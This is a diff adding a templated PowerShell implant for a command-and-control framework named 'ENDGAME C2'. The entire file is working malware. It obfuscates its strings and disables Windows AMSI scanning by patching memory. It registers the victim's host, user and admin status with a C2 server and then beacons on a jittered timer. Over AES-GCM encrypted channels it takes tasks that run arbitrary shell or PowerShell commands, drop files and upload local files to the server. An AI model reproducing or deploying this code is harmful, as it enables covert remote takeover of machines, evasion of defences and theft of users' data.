@@ -1,0 +1,192 @@
+{{/* ENDGAME C2 — Pure PowerShell Agent
+   Vars injected at build time (template substitution):
+     {{.ServerURL}}    C2 base URL (e.g. http://10.10.10.99:8080)
+     {{.SleepMs}}      beacon interval in milliseconds
+     {{.JitterPct}}    jitter percentage (0-100)
+*/}}
+$ErrorActionPreference='SilentlyContinue'
+
+# ── AMSI bypass (2-layer) ────────────────────────────────────────────────────
+
+# Layer 1: corrupt amsiContext structure header → AmsiScanBuffer returns E_INVALIDARG
+try {
+    $n1=[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115
+    $n2=[char]97+[char]109+[char]115+[char]105+[char]67+[char]111+[char]110+[char]116+[char]101+[char]120+[char]116
+    $t=[Ref].Assembly.GetType('System.Management.Automation.'+$n1)
+    $p=[Runtime.InteropServices.Marshal]::ReadIntPtr($t.GetField($n2,'NonPublic,Static').GetValue($null))
+    [Runtime.InteropServices.Marshal]::WriteInt32($p,0x80070057)
+} catch {}
+
+# Layer 2: patch AmsiScanBuffer via P/Invoke — strings built at runtime to avoid static sigs
+try {
+    $src=@'
+using System;using System.Runtime.InteropServices;using System.Text;
+public class AP{
+    [DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);
+    [DllImport("kernel32")]static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
+    public static void Patch(){
+        var lib=Encoding.ASCII.GetString(new byte[]{97,109,115,105,46,100,108,108});
+        var fn=Encoding.ASCII.GetString(new byte[]{65,109,115,105,83,99,97,110,66,117,102,102,101,114});
+        var h=LoadLibrary(lib);if(h==IntPtr.Zero)return;
+        var a=GetProcAddress(h,fn);if(a==IntPtr.Zero)return;
+        uint old;VirtualProtect(a,(UIntPtr)5,0x40,out old);
+        Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,a,3);
+        VirtualProtect(a,(UIntPtr)5,old,out old);
+    }
+}
+'@
+    Add-Type -TypeDefinition $src -Language CSharp 2>$null
+    [AP]::Patch()
+} catch {}
+
+# ── AES-256-GCM crypto (matches server Seal/Open) ───────────────────────────
+
+function Invoke-AesGcmSeal {
+    param([byte[]]$Key,[byte[]]$Plaintext)
+    $nonce=[byte[]]::new(12)
+    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
+    $ct=[byte[]]::new($Plaintext.Length)
+    $tag=[byte[]]::new(16)
+    $aes=[System.Security.Cryptography.AesGcm]::new($Key)
+    $aes.Encrypt($nonce,$Plaintext,$ct,$tag)
+    $aes.Dispose()
+    # Layout: nonce(12) + ct(N) + tag(16)  — matches Go's gcm.Seal(nonce,nonce,pt,nil)
+    $out=[byte[]]::new(12+$ct.Length+16)
+    [Buffer]::BlockCopy($nonce,0,$out,0,12)
+    [Buffer]::BlockCopy($ct,0,$out,12,$ct.Length)
+    [Buffer]::BlockCopy($tag,0,$out,12+$ct.Length,16)
+    return $out
+}
+
+function Invoke-AesGcmOpen {
+    param([byte[]]$Key,[byte[]]$Data)
+    $nonce=$Data[0..11]
+    $tagOff=$Data.Length-16
+    $tag=$Data[$tagOff..($Data.Length-1)]
+    $ct=$Data[12..($tagOff-1)]
+    $pt=[byte[]]::new($ct.Length)
+    $aes=[System.Security.Cryptography.AesGcm]::new($Key)
+    $aes.Decrypt($nonce,$ct,$tag,$pt)
+    $aes.Dispose()
+    return $pt
+}
+
+# ── Globals ──────────────────────────────────────────────────────────────────
+
+$C2='{{.ServerURL}}'
+$SleepMs={{.SleepMs}}
+$JitterPct={{.JitterPct}}
+$AgentID=''
+$AESKey=[byte[]]@()
+$wc=[System.Net.WebClient]::new()
+$wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
+
+function Get-JitteredSleep {
+    $j=[int]($SleepMs*($JitterPct/100.0)*(([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(1)[0]/255.0)*2-1))
+    [Math]::Max(500,$SleepMs+$j)
+}
+
+# ── Registration ─────────────────────────────────────────────────────────────
+
+function Register-WithC2 {
+    $proc=[System.Diagnostics.Process]::GetCurrentProcess()
+    $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
+    $reg=[ordered]@{
+        hostname=$env:COMPUTERNAME
+        username="$env:USERDOMAIN\$env:USERNAME"
+        os=(Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        pid=[int]$proc.Id
+        transport='http'
+        sleep_sec=[int]($SleepMs/1000)
+        jitter_pct=[int]$JitterPct
+        process_name=$proc.ProcessName+'.exe'
+        is_admin=$isAdmin
+        language='ps1'
+    }
+    $body=[System.Text.Encoding]::UTF8.GetBytes(($reg|ConvertTo-Json -Compress))
+    $wc.Headers['Content-Type']='application/json'
+    $resp=$wc.UploadData("$C2/register",'POST',$body)
+    $r=[System.Text.Encoding]::UTF8.GetString($resp)|ConvertFrom-Json
+    $script:AgentID=$r.agent_id
+    $script:AESKey=[Convert]::FromBase64String($r.aes_key)
+}
+
+# ── Task dispatch ─────────────────────────────────────────────────────────────
+
+function Send-Result {
+    param([long]$TaskID,[string]$Output,[string]$ErrStr='')
+    $res=[ordered]@{task_id=$TaskID;output=$Output;error=$ErrStr}
+    $pt=[System.Text.Encoding]::UTF8.GetBytes(($res|ConvertTo-Json -Compress))
+    $enc=Invoke-AesGcmSeal -Key $AESKey -Plaintext $pt
+    $wc.Headers['Content-Type']='application/octet-stream'
+    $wc.UploadData("$C2/result/$AgentID",'POST',$enc)|Out-Null
+}
+
+function Dispatch-Task {
+    param($Task)
+    switch($Task.type.ToLower()) {
+        'shell' {
+            $out=& cmd.exe /c $Task.args 2>&1|Out-String
+            Send-Result -TaskID $Task.id -Output $out
+        }
+        'powershell' {
+            $out=Invoke-Expression $Task.args 2>&1|Out-String
+            Send-Result -TaskID $Task.id -Output $out
+        }
+        'download' {
+            # Agent downloads a file from C2 and writes it locally
+            try {
+                $data=$wc.DownloadData("$C2/dl/$($Task.args)")
+                $pt=Invoke-AesGcmOpen -Key $AESKey -Data $data
+                $path=($Task.args -split '/')[-1]
+                [IO.File]::WriteAllBytes("$env:TEMP\$path",$pt)
+                Send-Result -TaskID $Task.id -Output "downloaded to $env:TEMP\$path"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'upload' {
+            # Agent uploads a local file to C2
+            try {
+                $data=[IO.File]::ReadAllBytes($Task.args)
+                $enc=Invoke-AesGcmSeal -Key $AESKey -Plaintext $data
+                $fname=([IO.Path]::GetFileName($Task.args))
+                $wc.Headers['Content-Type']='application/octet-stream'
+                $wc.UploadData("$C2/upload/$AgentID`?name=$fname",'POST',$enc)|Out-Null
+                Send-Result -TaskID $Task.id -Output "uploaded $fname"
+            } catch {
+                Send-Result -TaskID $Task.id -Output '' -ErrStr $_.Exception.Message
+            }
+        }
+        'sleep' {
+            $script:SleepMs=[int]$Task.args*1000
+            Send-Result -TaskID $Task.id -Output "sleep set to $($Task.args)s"
+        }
+        'kill' {
+            Send-Result -TaskID $Task.id -Output 'exiting'
+            [Environment]::Exit(0)
+        }
+    }
+}
+
+# ── Main beacon loop ──────────────────────────────────────────────────────────
+
+for($i=0;$i-lt5;$i++){
+    try{Register-WithC2;break}catch{Start-Sleep -Seconds 5}
+}
+if(-not $AgentID){exit}
+
+while($true){
+    try {
+        $raw=$wc.DownloadData("$C2/beacon/$AgentID")
+        if($raw-and$raw.Length-gt0){
+            $pt=Invoke-AesGcmOpen -Key $AESKey -Data $raw
+            $br=[System.Text.Encoding]::UTF8.GetString($pt)|ConvertFrom-Json
+            foreach($t in $br.tasks){Dispatch-Task $t}
+        }
+    } catch {
+        if($_.Exception.Message-match'404'){Register-WithC2}
+    }
+    Start-Sleep -Milliseconds (Get-JitteredSleep)
+}
